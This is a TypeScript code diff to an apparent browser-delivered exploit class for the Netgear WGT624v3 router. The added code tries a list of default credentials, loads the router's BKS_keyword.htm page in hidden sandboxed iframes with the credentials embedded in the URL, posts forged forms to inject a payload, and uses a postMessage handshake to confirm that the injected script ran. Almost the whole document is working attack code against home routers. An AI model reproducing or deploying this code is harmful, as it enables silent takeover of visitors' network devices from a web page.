@@ -27,12 +27,24 @@ class WGT624v3Payload extends BasePayload {
         );
     }
 
-    runPayload():Promise<any> {
+    runPayload():Promise<boolean> {
+        let doPayload = (credentials:BasicAuthCredential):Promise<boolean> => {
+            return this.tryInjectPayload(credentials)
+                .then(() => this.tryRunInjectedPayload(credentials))
+                .then((res:boolean) => {
+                    console.log("doPayload", this.baseUrl, credentials, res);
+                    return res;
+                });
+        }
+
         let injectTestPromiseFuncs = WGT624v3Payload.CREDENTIALS_TO_TEST.map((credentials:BasicAuthCredential) => {
-            return () => this.tryInjectPayload(credentials);
+            return () => doPayload(credentials);
         });
 
-        return PromiseUtil.sequentially(injectTestPromiseFuncs);
+        return PromiseUtil.sequentially(injectTestPromiseFuncs)
+            .then((results:boolean[]) => {
+                return results.some((r:boolean) => r);
+            });
     }
 
     private sendPostRequest(url:string, params:FormParam[]):Promise<any> {
@@ -54,6 +66,7 @@ class WGT624v3Payload extends BasePayload {
             frame.onload = () => {
                 frame.contentDocument.body.appendChild(form);
                 frame.onload = () => {
+                    // 2nd onload should be when the form has been posted
                     frame.remove();
                     resolve();
                 };
@@ -85,7 +98,60 @@ class WGT624v3Payload extends BasePayload {
             {name: 'bs_trustedip', value: '192.168.1.0'}
         ];
         return this.sendPostRequest(keywordUrl, addKeywordParams)
-            .then(() => this.sendPostRequest(keywordUrl, saveKeywordsParams));
+            .then(() => this.sendPostRequest(keywordUrl, saveKeywordsParams))
+    }
+
+    private waitForMessage(expectedMessage:string, timeout:number = 2000):Promise<Window> {
+        return new Promise((resolve, reject) => {
+            let timeoutId:number;
+            let done = (success:boolean, reason?:string) => {
+                clearTimeout(timeoutId);
+                window.removeEventListener('message', onMessage, false);
+                if (success) {
+                    resolve();
+                } else {
+                    reject();
+                }
+                console.log('waitForMessage', expectedMessage, success, reason);
+            }
+            let onTimeout = () => done(false, "onTimeout");
+            let onMessage = (evt:MessageEvent) => {
+                if (evt.data === expectedMessage) {
+                    done(true)
+                } else {
+                    done(false, `${evt.data} != ${expectedMessage}`);
+                }
+            }
+
+            window.addEventListener('message', onMessage, false);
+            timeoutId = setTimeout(onTimeout, timeout);
+        });
+    }
+
+    private tryRunInjectedPayload(credentials:BasicAuthCredential):Promise<boolean> {
+        let frame:HTMLIFrameElement = document.createElement('iframe');
+        frame.src = 'http://' + credentials.username + ':' + credentials.password + '@'
+            + this.fingerprintResult.ip + '/BKS_keyword.htm';
+        frame.sandbox.add('allow-scripts', 'allow-same-origin', 'allow-forms');
+        frame.style.display = 'none';
+        document.body.appendChild(frame);
+
+        return Promise.resolve()
+            .then(() => this.waitForMessage("#LOADED#"))
+            .then(() => frame.contentWindow.postMessage("#OK#", "*"))
+            .then(() => this.waitForMessage("#DONE#"))
+            .then(() => {
+                frame.remove();
+                return true
+            })
+            .catch((err) => {
+                if (err) {
+                    console.log('tryRunInjectedPayload error');
+                    console.error(err);
+                }
+                frame.remove();
+                return false
+            });
     }
 }
 
